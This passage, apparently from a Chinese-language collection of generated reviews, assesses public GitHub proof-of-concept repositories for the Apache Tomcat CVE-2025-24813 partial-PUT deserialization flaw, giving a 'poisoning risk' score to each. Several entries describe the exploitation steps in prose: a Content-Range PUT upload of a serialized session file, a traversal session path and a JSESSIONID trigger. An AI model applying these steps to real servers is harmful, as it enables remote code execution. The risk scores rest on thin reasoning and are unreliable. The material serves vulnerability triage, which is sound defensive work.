评估提供的 POC 代码，投毒风险较低，约为 **10%**。主要考虑因素如下：

*   **代码结构:** 代码结构较为清晰，主要分为获取 Session ID、验证 PUT 方法、生成 Payload 和发送 Payload 等几个模块。
*   **依赖项:**  代码依赖 `ysoserial.jar`，这本身是一个已知的漏洞利用工具，如果攻击者替换了 `ysoserial.jar` 文件，则可能引入恶意代码。此外，java payload方式需要服务器具有java编译环境。
*   **潜在风险:**  `java_payload` 函数中使用 `Runtime.getRuntime().exec(c)` 直接执行命令，如果命令字符串 `cmd` 构造不当，可能会存在命令注入的风险。
*   **作者声明:**  README 文件中包含免责声明，说明该代码仅用于教育目的，这在一定程度上降低了作者进行恶意投毒的可能性。

总的来说，虽然代码本身看起来没有明显的恶意行为，但仍然需要谨慎使用，并确保从可信的来源获取 `ysoserial.jar`，并仔细检查命令字符串，避免引入额外的安全风险。 java payload方式需要服务器具有java编译环境,具有一定局限性。

**项目地址:** [137f/Poc-CVE-2025-24813](https://github.com/137f/Poc-CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #2

**来源**: [CVE-2025-24813-Alaatk_CVE-2025-24813-POC.md](../2025/CVE-2025-24813-Alaatk_CVE-2025-24813-POC.md)

## CVE-2025-24813 Apache Tomcat 远程代码执行/信息泄露/文件篡改

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行/信息泄露/文件篡改

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行，信息泄露，文件被篡改

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 需要满足特定配置条件，包括启用Default Servlet的写入功能，启用partial PUT支持，存在安全敏感文件上传的目标URL位于公共上传目标URL的子目录中，攻击者已知安全敏感文件的名称，以及安全敏感文件通过partial PUT上传。或者，启用Default Servlet的写入功能，启用partial PUT支持，应用程序使用Tomcat基于文件的会话持久性与默认存储位置，应用程序包含一个可以在反序列化攻击中利用的库。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

根据漏洞库信息，CVE-2025-24813 涉及 Apache Tomcat 的路径等效问题，可能导致远程代码执行、信息泄露或恶意内容添加到上传的文件中。利用条件包括Default Servlet启用了写入，支持partial PUT，以及应用程序的特定配置。搜索引擎结果显示，该漏洞已被公开并被积极利用。

提供的 POC 代码尝试利用该漏洞。它首先使用 `argparse` 处理目标 URL 参数。然后，它包含一段 base64 编码的 payload，该 payload 是一个经过序列化的 Java 对象，旨在执行命令 `touch /tmp/RCE-success`。  该脚本将解码后的payload保存到`decoded_chain.bin`文件中。 然后，使用 `requests.put` 函数，通过构造包含 'Content-Range' 头部的 PUT 请求，利用 Tomcat 的 partial PUT 功能，将payload上传到目标服务器。PUT请求的目标URL是`TARGET_IP/payload.session`。脚本上传完成后删除临时文件。 最后使用Cookie进行getSession。

**有效性评估：** POC 的有效性取决于目标 Tomcat 服务器是否满足漏洞利用的全部条件。如果 Default Servlet 的写入已启用，并且启用了 partial PUT 支持，并且满足其他条件，则 POC 可能有效。

**投毒风险评估：** 仔细检查提供的 POC 代码，没有发现明显的投毒代码。该代码旨在利用已知的 Tomcat 漏洞，而不是在目标系统上植入后门或执行恶意操作。 代码中包含的base64编码的payload部分是最有可能存在风险的部分，但是payload中的命令是`touch /tmp/RCE-success`，该命令仅仅是创建一个文件，用于验证漏洞是否存在，并非恶意操作。

**利用方式总结：**

1.  **条件确认:** 确认目标 Tomcat 服务器启用了 Default Servlet 的写入功能，并启用了 partial PUT 支持，以及是否满足其他相关条件。
2.  **Payload 生成:**  生成一个恶意 Java 序列化对象，该对象可以执行任意代码，或者读取敏感文件。
3.  **Partial PUT 上传:**  使用 HTTP PUT 请求，通过设置 `Content-Range` 头部，将恶意 payload 分块上传到目标服务器上的特定路径（例如，`payload.session`）。
4.  **触发反序列化：**  Tomcat 尝试反序列化上传的文件，从而触发恶意代码的执行。


**项目地址:** [Alaatk/CVE-2025-24813-POC](https://github.com/Alaatk/CVE-2025-24813-POC)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #3

**来源**: [CVE-2025-24813-AlperenY-cs_CVE-2025-24813.md](../2025/CVE-2025-24813-AlperenY-cs_CVE-2025-24813.md)

## CVE-2025-24813 - Apache Tomcat 路径等价性漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE) / 信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行、信息泄露和恶意内容注入

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 需要满足多个条件，包括：默认Servlet开启写入 (默认关闭)，支持Partial PUT (默认开启)，存在安全敏感文件的目标URL是公共上传目标URL的子目录，攻击者知晓敏感文件名，安全敏感文件通过Partial PUT上传，或应用程序使用Tomcat文件会话持久性（默认位置），应用程序包含可用于反序列化攻击的库。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价性漏洞。该漏洞允许攻击者通过精心构造的包含内部点（file.Name）的文件名，利用默认Servlet中启用的写入功能和Partial PUT支持，进行远程代码执行、信息泄露和恶意内容注入。根据漏洞描述，攻击成功的关键在于Tomcat的配置以及应用程序是否使用了易受攻击的组件。

**有效性：** 从搜索结果来看，该漏洞已被确认存在并且有在野利用。但是，漏洞利用需要满足多个非默认配置条件，因此并非所有Tomcat实例都易受攻击。提供的POC代码 `/tmp/9a20e2370d216dc00af3f4d6145c600e/README.md` 内容过于简单，仅包含CVE编号，并不能直接用于漏洞利用，需要根据具体情况编写特定的利用代码，例如构造恶意的PUT请求。

**投毒风险：** 提供的POC代码非常简单，主要就是包含 CVE-2025-24813 的 README.md 文件。因此，投毒风险很低，但是不排除作者在其他相关文件中隐藏恶意代码的可能性，只是没有在此次提交中呈现，考虑到文件数量极少,故判断存在10%的投毒风险。

**利用方式：** 漏洞利用主要通过以下步骤：

1.  **利用Partial PUT上传恶意文件：** 攻击者构造包含内部点的文件名，并通过Partial PUT请求将其上传到目标服务器。
2.  **绕过路径检查：** 由于路径等价性问题，Tomcat可能无法正确处理包含内部点的文件名，导致绕过路径检查。
3.  **信息泄露/恶意内容注入：** 如果目标是信息泄露或恶意内容注入，攻击者需要知道目标敏感文件的名称和路径，然后通过覆盖或修改该文件来实现目的。
4.  **远程代码执行：** 如果应用程序使用了Tomcat的文件会话持久性，并且包含可用于反序列化攻击的库，攻击者可以利用该漏洞将恶意序列化对象写入会话文件，从而实现远程代码执行。攻击者可能会覆盖session文件，然后触发反序列化。

**总结：** CVE-2025-24813 是一个高危漏洞，但是利用条件较为苛刻。 提供的POC代码过于简单，无法直接用于攻击，需要根据目标环境进行定制。在实际环境中，需要仔细评估Tomcat的配置和应用程序的安全性，以确定是否存在被利用的风险。同时需要关注针对该漏洞的攻击尝试并及时采取缓解措施，例如禁用默认Servlet的写入功能或升级到修复版本。

**项目地址:** [AlperenY-cs/CVE-2025-24813](https://github.com/AlperenY-cs/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #4

**来源**: [CVE-2025-24813-AsaL1n_CVE-2025-24813.md](../2025/CVE-2025-24813-AsaL1n_CVE-2025-24813.md)

## CVE-2025-24813 - Apache Tomcat 路径等价性漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE) / 信息泄露 / 内容篡改

**影响应用:** Apache Tomcat

**危害等级:** 高危 (取决于配置和利用方式，可能导致RCE、敏感信息泄露或文件内容篡改)

**影响版本:** Apache Tomcat 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** RCE需要满足以下条件：writes enabled for default servlet, support for partial PUT, 使用Tomcat文件session持久化默认位置, 应用包含可被反序列化攻击利用的库。信息泄露/内容篡改需要满足以下条件：writes enabled for default servlet, support for partial PUT, security sensitive上传URL是公共上传URL的子目录, 攻击者知道security sensitive文件的名字, security sensitive文件也是通过partial PUT上传。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是一个Apache Tomcat中的路径等价性漏洞，源于对文件名中内部点（'file.Name'）处理不当。根据漏洞描述和搜索结果，此漏洞在特定配置下可能导致远程代码执行（RCE）、信息泄露或恶意内容被添加到上传文件中。

**有效性：**
根据搜索引擎结果和漏洞描述，该漏洞已被积极利用。提供的PoC代码利用了Tomcat的partial PUT特性以及session持久化机制（在满足一定条件下），尝试通过上传恶意序列化数据来实现RCE。

**利用方式：**
1.  **前提条件：**
    *   Tomcat的default servlet需要开启写入功能（默认关闭）。
    *   需要启用partial PUT支持（默认开启）。
    *   （RCE）应用使用Tomcat的文件session持久化，且为默认存储位置。
    *   （RCE）应用包含可被反序列化攻击利用的库，例如存在fastjson, jackson等。
    *   （信息泄露/内容篡改）存在安全敏感文件上传URL是公共上传URL的子目录， 且攻击者知道该敏感文件名。
2.  **攻击步骤：**
    *   攻击者构造一个恶意的序列化对象，对其进行Base64编码（PoC中`-d/--data` 参数）。
    *   攻击者指定目标URL（PoC中`-u/--url` 参数）。
    *   PoC脚本首先向目标URL发送PUT请求，其中`Content-Range`头指定了上传的范围，利用Tomcat的partial PUT特性。
    *   如果服务器返回409状态码，则表示partial PUT已成功处理。
    *   之后，PoC脚本会发送GET请求，并携带包含恶意序列化数据的JSESSIONID cookie（`.{random_str}`）。
    *   Tomcat反序列化session数据，从而触发RCE (如果满足RCE条件)。

**投毒风险：**
分析提供的PoC代码和Readme，可以发现：
*   脚本本身的功能是利用漏洞进行攻击。
*   脚本中没有发现明显的恶意代码，例如植入后门、篡改系统文件等。
*   脚本需要用户提供Base64编码的序列化数据，这意味着攻击者需要自行生成payload，脚本只是负责发送payload。
*   Readme中指明了利用方式及所需条件，较为详细。

因此，该仓库中存在作者隐藏的恶意代码的可能性较低，但不能完全排除。投毒风险评估为 10%。风险主要在于用户可能下载了被篡改过的poc，或者运行了来历不明的payload, 这些payload可能包含恶意行为。

**项目地址:** [AsaL1n/CVE-2025-24813](https://github.com/AsaL1n/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #5

**来源**: [CVE-2025-24813-B1gN0Se_Tomcat-CVE-2025-24813.md](../2025/CVE-2025-24813-B1gN0Se_Tomcat-CVE-2025-24813.md)

## CVE-2025-24813 - Apache Tomcat RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE) / 信息泄露 / 文件篡改

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行，信息泄露和文件被恶意修改

**影响版本:** 9.0.0.M1 <= Apache Tomcat <= 9.0.98, 10.1.0-M1 <= Apache Tomcat <= 10.1.34, 11.0.0-M1 <= Apache Tomcat <= 11.0.2

**利用条件:** DefaultServlet 写入功能启用 (readonly=false), Partial PUT 请求支持 (Tomcat 默认支持), 文件会话持久化启用 (context.xml 配置 PersistentManager 和 FileStore), 存在反序列化利用链 (类路径下包含存在漏洞的库)

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，该漏洞源于 'file.Name' (内部点) 的处理不当。如果满足以下所有条件，则可能导致远程代码执行，信息泄露或文件篡改：

1.  **DefaultServlet 写入功能启用：** 必须在 `web.xml` 中配置 `readonly=false`，允许 DefaultServlet 写入文件。
2.  **Partial PUT 请求支持：** Tomcat 默认支持分块上传，允许攻击者通过分块上传恶意文件。
3.  **文件会话持久化启用：** 需要在 `context.xml` 中配置 `PersistentManager` 和 `FileStore`，启用基于文件的会话存储。
4.  **存在反序列化利用链：** 类路径下需要包含存在漏洞的库（例如，`commons-collections-3.2.1.jar`），使得攻击者可以通过反序列化漏洞执行任意代码。
5.  **信息泄露/文件篡改的先决条件:** 除了上述条件外，还需要满足：writes enabled for the default servlet, support for partial PUT, a target URL for security sensitive uploads that was a sub-directory of a target URL for public uploads, attacker knowledge of the names of security sensitive files being uploaded, the security sensitive files also being uploaded via partial PUT

**利用方式：**

1.  攻击者首先利用 Partial PUT 请求上传一个恶意构造的序列化对象，该对象包含一个反序列化利用链（例如，使用 Commons Collections）。
2.  由于启用了 DefaultServlet 的写入功能，恶意文件可以被写入到 Tomcat 的会话存储目录中。
3.  当 Tomcat 尝试反序列化该会话时，由于存在利用链，攻击者可以执行任意代码。
4. 若目标满足信息泄露/文件篡改的先决条件,攻击者可以通过构造恶意的Partial PUT请求，利用路径等价绕过限制，最终实现信息泄露或者文件篡改

**投毒风险分析：**

该POC代码提供了一个 Docker Compose 文件，用于搭建易受攻击的 Tomcat 环境。该环境配置了必要的组件（DefaultServlet 写入，Partial PUT，文件会话持久化），并且包含了一个 Commons Collections 库，可以用于反序列化攻击。

代码本身看起来是直接了当的漏洞演示。投毒风险较低，但是使用该POC时仍需注意。

**有效性分析：**

根据漏洞库信息、搜索结果以及提供的利用代码来看，该漏洞已经确认被利用，并且相关的利用方式和利用条件已经比较清晰。提供的POC代码针对的是 RCE 部分，有效性较高，但成功利用取决于是否满足所有前提条件。

**项目地址:** [B1gN0Se/Tomcat-CVE-2025-24813](https://github.com/B1gN0Se/Tomcat-CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #6

**来源**: [CVE-2025-24813-CEAlbez_CVE-2025-24813-PoC.md](../2025/CVE-2025-24813-CEAlbez_CVE-2025-24813-PoC.md)

## CVE-2025-24813 - Apache Tomcat Path Equivalence/Partial PUT RCE/信息泄露

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/Partial PUT远程代码执行/信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露

**影响版本:** 9.0.0.M1 <= 9.0.98, 10.1.0-M1 <= 10.1.34, 11.0.0-M1 <= 11.0.2

**利用条件:** 需要满足多个条件：默认Servlet启用写入(默认禁用)，启用Partial PUT(默认启用)，目标URL是公共上传URL的子目录，攻击者知道敏感文件名，并且通过Partial PUT上传敏感文件。RCE还需要应用程序使用Tomcat的文件会话持久性，以及存在可利用的反序列化库。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813是Apache Tomcat中的一个路径等价漏洞，结合启用了写入功能的默认Servlet和Partial PUT功能，可能导致远程代码执行和敏感信息泄露。漏洞利用方式如下：

1.  **信息泄露/内容注入:** 如果满足以下条件：
    *   默认Servlet启用写入（默认禁用）
    *   启用Partial PUT（默认启用）
    *   目标URL是公共上传URL的子目录
    *   攻击者知道敏感文件名
    *   通过Partial PUT上传敏感文件
攻击者可以查看敏感文件或向其中注入恶意内容。

2.  **远程代码执行 (RCE):** 如果满足以下条件：
    *   默认Servlet启用写入（默认禁用）
    *   启用Partial PUT（默认启用）
    *   应用程序使用Tomcat的文件会话持久性，且使用默认存储位置
    *   应用程序包含可利用的反序列化库
攻击者可以通过上传恶意序列化session文件，利用反序列化漏洞执行任意代码。

**有效性：**
根据搜索结果，CVE-2025-24813漏洞存在活跃的利用。PoC代码的README描述了一个基本的利用流程，包括克隆仓库、安装依赖、运行PoC脚本，表明该PoC可能有效，但具体利用成功与否取决于目标环境的配置是否满足漏洞利用条件。PoC的有效性较高，因为搜索结果显示该漏洞正在被积极利用。

**投毒风险：**
分析提供的PoC代码（README.md），投毒风险较低。README.md文件只包含漏洞描述、环境配置、使用方法和免责声明。虽然PoC代码没有直接展示`poc.py`的内容，但是根据描述`poc.py`脚本会提示用户输入目标URL，表明其功能是针对目标进行漏洞验证而非植入后门。当然，`poc.py`本身可能包含恶意代码。在没有查看 `poc.py` 的内容的情况下，预估`poc.py`存在投毒代码的可能性较低，大约10%。主要考虑到以下几点：

*   PoC旨在验证漏洞的存在，而非长期控制目标系统。
*   公开的PoC代码通常会接受安全社区的审查，增加投毒的难度。
*   作者声明仅用于教育和研究目的。

**利用方式总结：**
攻击者利用此漏洞的方式是，首先需要满足前置条件（Default Servlet开启写入、Partial PUT启用等）。然后，通过构造恶意的PUT请求，并利用路径等价，覆盖或者修改敏感文件，实现信息泄露或RCE。RCE场景依赖于反序列化漏洞的利用，需要上传精心构造的恶意序列化数据。

**项目地址:** [CEAlbez/CVE-2025-24813-PoC](https://github.com/CEAlbez/CVE-2025-24813-PoC)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #7

**来源**: [CVE-2025-24813-Eduardo-hardvester_CVE-2025-24813.md](../2025/CVE-2025-24813-Eduardo-hardvester_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-路径遍历/反序列化RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径遍历/反序列化RCE

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 1. 默认Servlet开启了写入 (默认禁用)
2. 支持Partial PUT (默认启用)
3. 应用使用Tomcat基于文件的Session持久化, 使用默认存储位置
4. 应用包含可被反序列化攻击利用的库

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，攻击者可以利用 'file.Name' (内部点) 来实现远程代码执行和/或信息泄露，以及/或通过启用了写入的默认 Servlet 向上传的文件添加恶意内容。

**漏洞利用方式：**
1.  **信息泄露/恶意内容添加：**  如果满足以下条件，攻击者可以查看安全敏感文件或向其中注入内容：
    *   默认 Servlet 启用了写入（默认禁用）。
    *   支持 Partial PUT（默认启用）。
    *   安全敏感上传的目标 URL 是公共上传目标 URL 的子目录。
    *   攻击者知道要上传的安全敏感文件的名称。
    *   通过 Partial PUT 上传安全敏感文件。

2.  **远程代码执行：**  如果满足以下条件，攻击者可以执行远程代码：
    *   默认 Servlet 启用了写入（默认禁用）。
    *   支持 Partial PUT（默认启用）。
    *   应用程序使用 Tomcat 的基于文件的会话持久性，并且使用默认的存储位置。
    *   应用程序包含一个可以用于反序列化攻击的库。

**POC分析：**
POC利用脚本`CVE_2025_24813.py`的利用流程大概如下：
1.  检查目标服务器的默认servlet是否开启PUT方法，主要通过PUT请求上传一个文件来判断.
2.  如果目标开启了PUT方法，则会生成一个ysoserial的payload，指定gadget和要执行的命令.
3.  然后将payload上传到`target_url/uploads/../sessions/{session_id}.session`，session_id是由参数指定

**投毒风险分析：**
*   脚本主要功能是漏洞利用，没有发现明显的恶意代码。
*   脚本会生成payload并上传，这个过程可能存在一定风险，但主要取决于执行的命令和payload的内容，而非脚本本身。
*  脚本中存在一些临时文件创建，然后删除的操作，例如`Exploit.java`, `Exploit.class`，这些是payload构造过程中的正常步骤，但如果删除失败，可能会在服务器上留下痕迹。
*  脚本有生成java payload的逻辑，但是java payload的生成是直接拼接字符串，命令在字符串中比较明显，不太容易做手脚。
*  考虑到ysoserial payload本身就可能被认为是具有潜在危害，因此将投毒风险评估为5%。主要是payload本身可能存在的潜在风险。

**结论：**
提供的POC代码看起来是有效的，如果目标环境满足漏洞利用的条件，可以成功执行命令。投毒风险较低，主要风险在于利用过程中生成的payload可能带来的危害。

**项目地址:** [Eduardo-hardvester/CVE-2025-24813](https://github.com/Eduardo-hardvester/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #8

**来源**: [CVE-2025-24813-Erosion2020_CVE-2025-24813-vulhub.md](../2025/CVE-2025-24813-Erosion2020_CVE-2025-24813-vulhub.md)

## CVE-2025-24813-Apache Tomcat 路径等价和反序列化漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行/信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 写入已启用默认Servlet,支持部分PUT,针对敏感上传的URL是公共上传URL的子目录,攻击者了解正在上传的安全敏感文件的名称,安全敏感文件也通过部分PUT上传. 或 写入已启用默认Servlet,支持部分PUT,应用程序使用Tomcat基于文件的会话持久化，使用默认存储位置,应用程序包含可能在反序列化攻击中被利用的库

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞（CWE-44）和一个反序列化漏洞(CWE-502)。 根据漏洞库信息和搜索结果，漏洞利用涉及利用 Tomcat 默认 Servlet 的写入功能和部分 PUT 请求处理机制中的缺陷。 

**有效性分析：**
 根据搜索结果，CVE-2025-24813 漏洞已被积极利用。 多个来源（Rapid7, Recorded Future, Akamai, Zscaler, 西オアフ大学, XM Cyber, SonicWall, Esri）证实了这一点。Unit42 的报告也提供了测试该漏洞的信息。 提供的 POC 代码描述简单，是 vulhub 环境的搭建说明，但考虑到其他来源指出漏洞已被积极利用，可以认为存在可用的利用代码。

**投毒风险分析：**
 POC代码仅提供了一个用于搭建vulhub环境的README文档，内容非常简单，只包含 CVE-2025-24813 的 vulhub 环境的 POC 脚本说明。 这种情况下，作者进行恶意代码投毒的可能性很低。 因此，投毒风险评估为1%。

**利用方式分析：**
 根据漏洞描述，存在两种主要的利用方式：
 1. **信息泄露/恶意内容注入：** 如果满足以下所有条件，攻击者能够查看安全敏感文件和/或将内容注入这些文件：
    *   写入已启用默认 Servlet（默认禁用）。
    *   支持部分 PUT（默认启用）。
    *   安全敏感上传的目标 URL 是公共上传目标 URL 的子目录。
    *   攻击者了解正在上传的安全敏感文件的名称。
    *   安全敏感文件也通过部分 PUT 上传。
 2.  **远程代码执行：** 如果满足以下所有条件，攻击者能够执行远程代码：
    *   写入已启用默认 Servlet（默认禁用）。
    *   支持部分 PUT（默认启用）。
    *   应用程序使用 Tomcat 基于文件的会话持久化，使用默认存储位置。
    *   应用程序包含可能在反序列化攻击中被利用的库。

总而言之，漏洞利用依赖于对 Tomcat 服务器的配置和应用程序的特定环境的利用，包括启用的写入权限、对部分 PUT 请求的支持以及应用程序中存在的潜在反序列化漏洞。

**项目地址:** [Erosion2020/CVE-2025-24813-vulhub](https://github.com/Erosion2020/CVE-2025-24813-vulhub)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #9

**来源**: [CVE-2025-24813-FY036_cve-2025-24813_poc.md](../2025/CVE-2025-24813-FY036_cve-2025-24813_poc.md)

## CVE-2025-24813-Apache Tomcat-路径等价/反序列化

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/反序列化

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 9.0.0.M1 <= Tomcat <= 9.0.98, 10.1.0-M1 <= Tomcat <= 10.1.34, 11.0.0-M1 <= Tomcat <= 11.0.2

**利用条件:** 需要启用Default Servlet的写入权限, 支持Partial PUT, 且目标URL为公共上传URL的子目录, 攻击者需要知道敏感文件名, 安全敏感文件也通过partial PUT上传。或者，需要启用Default Servlet的写入权限, 支持Partial PUT, 应用使用Tomcat基于文件的session持久化，应用包含可用于反序列化攻击的库。

**POC 可用性:** 是

**投毒风险:** 95%

## 详情

CVE-2025-24813是Apache Tomcat中的一个漏洞，涉及路径等价问题，可能导致远程代码执行（RCE）和信息泄露。根据漏洞库信息和搜索引擎结果，该漏洞的利用涉及以下几个关键点：

1.  **路径等价 ('file.Name' (Internal Dot))**：攻击者可以通过操纵文件路径，绕过安全限制，访问或修改受保护的文件。
2.  **Default Servlet写入权限**：需要启用Default Servlet的写入权限（默认禁用）。
3.  **Partial PUT支持**：需要启用Partial PUT支持（默认启用）。攻击者可以通过分块上传恶意文件，从而绕过某些安全检查。
4.  **特定场景下的RCE**：
    *   如果应用程序使用Tomcat的基于文件的会话持久性，并且包含一个可以被用于反序列化攻击的库，攻击者可以通过上传包含恶意序列化数据的会话文件，执行任意代码。
    *   如果目标URL为公共上传URL的子目录, 攻击者需要知道敏感文件名, 安全敏感文件也通过partial PUT上传，可能导致信息泄露。

**漏洞利用方式：**

1.  **利用路径等价绕过**：攻击者可能利用`file.Name`中的内部点（Internal Dot）来访问或修改受保护的文件。
2.  **Partial PUT攻击**：攻击者通过分块上传恶意文件，例如包含恶意序列化数据的会话文件，到Tomcat服务器上。
3.  **反序列化漏洞利用**：如果应用程序包含可以被用于反序列化攻击的库，攻击者可以使用精心构造的序列化数据，在服务器上执行任意代码。

**POC代码分析：**

提供的POC代码 `CVE-2025-24813-poc.py` 尝试利用该漏洞。它执行以下步骤：

1.  **发送反序列化数据**：使用 `send_request` 函数发送一个base64编码的反序列化数据到Tomcat服务器。该请求使用 `Content-Range` 头，模拟Partial PUT请求。
2.  **触发反序列化**：使用 `send_request_two` 函数，通过设置 `JSESSIONID` cookie，尝试触发反序列化过程。
3.  **验证漏洞**：检查服务器的响应状态码。如果状态码为409（冲突）且`send_request_two`返回1（状态码500），则认为漏洞存在。

**有效性评估：**

该POC代码尝试利用了基于反序列化的RCE漏洞。但是，该POC并没有提供完整的利用链，只是验证了漏洞的存在。因此，该POC代码的有效性取决于目标应用程序是否满足漏洞利用的全部条件，包括：

*   启用了Default Servlet的写入权限。
*   支持Partial PUT。
*   应用程序使用Tomcat基于文件的会话持久性。
*   应用程序包含可用于反序列化攻击的库。

**投毒风险评估：**

该POC代码存在较高的投毒风险。原因如下：

*   **未知的反序列化利用链**：POC代码中使用的反序列化数据 `rO0ABXNyAAtFeHBsb2l0VGVzdAAAAAAAAAABAwAAeHB4` 只是一个占位符，并没有包含实际的恶意代码。攻击者需要自行寻找并插入合适的利用链，才能实现RCE。
*   **可能包含恶意代码**：由于利用链需要攻击者自行构造，攻击者可能会在POC代码中插入恶意代码，例如后门或恶意脚本，从而感染其他用户。
*   **依赖外部资源**：POC代码可能会依赖外部资源，例如远程服务器或恶意网站。攻击者可以通过篡改这些外部资源，实现投毒攻击。

由于存在上述风险，建议用户在使用该POC代码时保持警惕，并仔细审查代码，确保其不包含任何恶意成分。

**综上所述，该POC代码的有效性取决于目标环境的配置和应用程序的依赖。同时，由于反序列化利用的复杂性和潜在的恶意代码注入风险，该POC代码存在较高的投毒风险。**

**项目地址:** [FY036/cve-2025-24813_poc](https://github.com/FY036/cve-2025-24813_poc)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #10

**来源**: [CVE-2025-24813-Franconyu_Poc_for_CVE-2025-24813.md](../2025/CVE-2025-24813-Franconyu_Poc_for_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat 反序列化RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 反序列化远程代码执行

**影响应用:** Apache Tomcat

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 需要满足以下所有条件：
1.  默认Servlet开启了写入 (默认关闭)
2.  支持Partial PUT (默认开启)
3.  应用使用Tomcat基于文件的Session持久化，且使用默认存储位置
4.  应用包含一个可用于反序列化攻击的库

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个反序列化远程代码执行漏洞。该漏洞利用了Tomcat处理部分 PUT 请求时文件路径等效性问题，攻击者可以通过上传恶意构造的文件，在特定配置下实现远程代码执行。

**有效性分析:**

根据漏洞库信息、搜索引擎结果以及提供的漏洞利用代码，可以判断该漏洞的POC代码有效。搜索引擎结果显示该漏洞已经被积极利用，并且有公开的利用代码。POC代码中包含了版本检测功能，以及利用ysoserial生成payload进行攻击的功能。

**投毒风险分析:**

POC 代码存在一定的投毒风险，虽然主要功能是漏洞验证，但是可能存在以下潜在风险：
*   **Payload 生成依赖外部工具:**  POC依赖ysoserial生成payload，如果ysoserial被替换为恶意版本，可能导致投毒。
*   **自定义恶意Payload:**  攻击者可能会修改payload生成部分，植入恶意代码。
*   **不完善的错误处理:** 代码中错误处理可能不够完善，可能存在导致拒绝服务或其他意外行为。

综合考虑，POC代码主要用于验证漏洞，但仍存在一定投毒风险。可以评估为20%。

**利用方式:**

1.  **版本检测:**  POC首先检测目标Tomcat的版本，判断是否存在漏洞。
2.  **Payload生成:**  如果目标版本存在漏洞，POC会根据选择的模式（弹计算器、DNS验证等），使用ysoserial生成反序列化payload。
3.  **Partial PUT上传:**  POC通过发送带有`Content-Range`头的PUT请求，将payload上传到Tomcat服务器。
4.  **触发反序列化:**  通过构造包含恶意Session ID的GET请求或其他方式触发反序列化，从而执行payload中的恶意代码。

**项目地址:** [Franconyu/Poc_for_CVE-2025-24813](https://github.com/Franconyu/Poc_for_CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #11

**来源**: [CVE-2025-24813-GadaLuBau1337_CVE-2025-24813.md](../2025/CVE-2025-24813-GadaLuBau1337_CVE-2025-24813.md)

## CVE-2025-24813 Apache Tomcat 远程代码执行漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

